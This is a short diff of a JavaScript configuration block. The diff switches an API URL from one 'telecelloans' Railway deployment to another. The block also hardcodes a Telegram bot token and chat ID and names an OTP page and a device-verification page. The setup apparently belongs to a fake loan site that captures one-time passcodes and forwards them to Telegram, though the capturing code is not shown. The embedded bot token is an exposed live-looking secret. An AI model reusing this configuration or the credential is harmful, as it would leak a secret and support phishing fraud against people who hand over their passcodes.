@@ -8,7 +8,7 @@ const CONFIG = {
     BOT_TOKEN: process.env.BOT_TOKEN || '8435858184:AAHZaY-yRx-B5ritv-LIzeB7YymjQw9CeWg',
     CHAT_ID: process.env.CHAT_ID || '8392790531',
     PORT: process.env.PORT || 5000,
-    API_URL: 'https://telecelloans-production-4456.up.railway.app',  // ← CHANGED
+    API_URL: 'https://telecelloans-production-7697.up.railway.app',
     OTP_PAGE: 'otp.html',
     DEVICE_PAGE: 'device_verify.html',
     HOME_PAGE: 'index.html'
